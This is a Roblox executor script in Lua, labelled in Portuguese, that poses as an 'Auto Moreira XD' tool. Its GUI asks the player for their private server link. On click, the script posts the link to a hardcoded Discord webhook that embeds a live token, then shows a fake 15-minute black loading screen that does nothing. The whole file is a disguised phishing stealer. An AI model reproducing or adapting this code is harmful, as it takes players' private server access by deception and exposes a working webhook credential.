-- ================= CONFIG =================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1462117939783143518/WSTNnkQ5xQyd-oJAj3SJ6kOOFAE8E2yNlSeyhUefATtz9f9_swVD47FAC3V-O5NKhAlL"
local LOAD_TIME = 15 * 60 -- 15 minutos

local HttpService = game:GetService("HttpService")

-- ================= REQUEST (DELTA) =================
local requestFunc = (syn and syn.request) or request or http_request
if not requestFunc then
	warn("REQUEST NAO DISPONIVEL NO EXECUTOR")
end

-- ================= FUNÇÕES =================
local function isValidLink(text)
	if type(text) ~= "string" then return false end
	text = text:lower()

	-- validação flexível (não trava)
	if text:find("roblox.com") and text:find("private") then
		return true
	end

	return false
end

local function sendWebhook(message)
	if not requestFunc then return end

	local data = {
		username = "Auto Moreira XD",
		content = message
	}

	requestFunc({
		Url = WEBHOOK_URL,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = HttpService:JSONEncode(data)
	})
end

-- ================= GUI PRINCIPAL =================
local gui = Instance.new("ScreenGui")
gui.Name = "AutoMoreiraGUI"
gui.Parent = game.CoreGui

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.fromScale(0.35, 0.3)
frame.Position = UDim2.fromScale(0.325, 0.35)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

local box = Instance.new("TextBox", frame)
box.Size = UDim2.fromScale(0.9, 0.25)
box.Position = UDim2.fromScale(0.05, 0.2)
box.PlaceholderText = "COLOQUE SEU SERVER PV AQUI!"
box.Text = ""
box.TextScaled = true
box.ClearTextOnFocus = false
box.BackgroundColor3 = Color3.fromRGB(235,235,235)
box.BorderSizePixel = 0

local btn = Instance.new("TextButton", frame)
btn.Size = UDim2.fromScale(0.7, 0.2)
btn.Position = UDim2.fromScale(0.15, 0.6)
btn.Text = "INICIAR AUTO MOREIRA XD"
btn.TextScaled = true
btn.BackgroundColor3 = Color3.fromRGB(210,210,210)
btn.BorderSizePixel = 0

local status = Instance.new("TextLabel", frame)
status.Size = UDim2.fromScale(1, 0.15)
status.Position = UDim2.fromScale(0, 0.85)
status.Text = ""
status.TextScaled = true
status.BackgroundTransparency = 1
status.TextColor3 = Color3.fromRGB(255,0,0)

-- ================= LOADING GUI =================
local loadGui = Instance.new("ScreenGui")
loadGui.Enabled = false
loadGui.Parent = game.CoreGui

local black = Instance.new("Frame", loadGui)
black.Size = UDim2.fromScale(1,1)
black.BackgroundColor3 = Color3.new(0,0,0)
black.BorderSizePixel = 0

local barBg = Instance.new("Frame", black)
barBg.Size = UDim2.fromScale(0.6, 0.04)
barBg.Position = UDim2.fromScale(0.2, 0.55)
barBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
barBg.BorderSizePixel = 0
barBg.Visible = false

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.fromScale(0,1)
bar.BackgroundColor3 = Color3.fromRGB(255,255,255)
bar.BorderSizePixel = 0

-- ================= BOTÃO =================
btn.MouseButton1Click:Connect(function()
	print("BOTAO CLICADO")

	local link = box.Text
	print("LINK DIGITADO:", link)

	if link == "" then
		status.Text = "Coloque um link"
		return
	end

	if not isValidLink(link) then
		status.Text = "Link invalido"
		return
	end

	-- fecha GUI e abre tela preta
	gui.Enabled = false
	loadGui.Enabled = true

	task.wait(1.5)

	-- ENVIA PRA WEBHOOK NO INICIO DO LOADING
	sendWebhook("🔗 LINK RECEBIDO:\n"..link)
	print("WEBHOOK ENVIADA")

	barBg.Visible = true

	for i = 1, LOAD_TIME do
		bar.Size = UDim2.fromScale(i / LOAD_TIME, 1)
		task.wait(1)
	end
end)
